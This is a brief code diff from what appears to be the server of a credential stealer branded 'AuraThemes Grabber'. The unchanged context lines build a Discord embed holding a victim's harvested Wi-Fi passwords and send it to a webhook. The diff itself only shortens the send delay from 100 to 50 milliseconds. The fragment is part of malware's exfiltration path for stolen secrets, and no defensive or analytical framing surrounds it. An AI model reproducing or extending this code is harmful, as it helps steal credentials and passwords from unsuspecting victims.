@@ -72,7 +72,7 @@ app.post('/request/startup', (req, res) => {
       .addField("<:aura:1160509472146468924> Wifi ALL Password(s)", `\`${req.WifiPass}\``)
       .setFooter("AuraThemes Grabber")
       .setTimestamp();
-    setTimeout(async () =>  await webhook.send(embed2), 100)
+    setTimeout(async () =>  await webhook.send(embed2), 50)
   });
 });
 
